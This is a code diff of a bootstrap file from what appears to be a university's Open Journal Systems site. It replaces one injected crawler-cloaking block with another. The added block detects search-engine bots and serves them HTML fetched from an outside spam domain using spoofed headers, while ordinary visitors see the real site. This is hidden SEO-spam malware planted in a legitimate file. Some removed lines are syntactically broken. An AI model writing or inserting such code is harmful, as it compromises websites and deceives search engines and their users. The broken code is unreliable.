@@ -1,36 +1,37 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'AhrefsBot', 'Google-Site-Verification', 'Google-InspectionTool');
+@ob_start();
+header("Vary: U-Agent");
 
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
+$src = "https://obeydasupreme.site/obs/uinjambi.html";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
 }
 
-function is_homepage() {
-    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-    return $uri === '/' || $uri === '';
-}
-
-if (is_bot()) {
-    if (is_homepage()) {
-        include('/home/lp2m/public_html/ojs.lp2m.uinjambi.ac.id/registry/pages.css);
-    } else {
-        header("Location: https://ojs.lp2m.uinjambi.ac.id/", true, 301);
-    }
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
     exit;
 }
+?>
+<?php
 
-/
+/**
  * @defgroup index Index
  * Bootstrap and initialization code.
  */
 
-/
+/**
  * @file includes/bootstrap.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
@@ -51,8 +52,8 @@ if (is_bot()) {
 
 define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
 if (!defined('DIRECTORY_SEPARATOR')) {
-  // Older versions of PHP do not define this
-  define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
 }
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
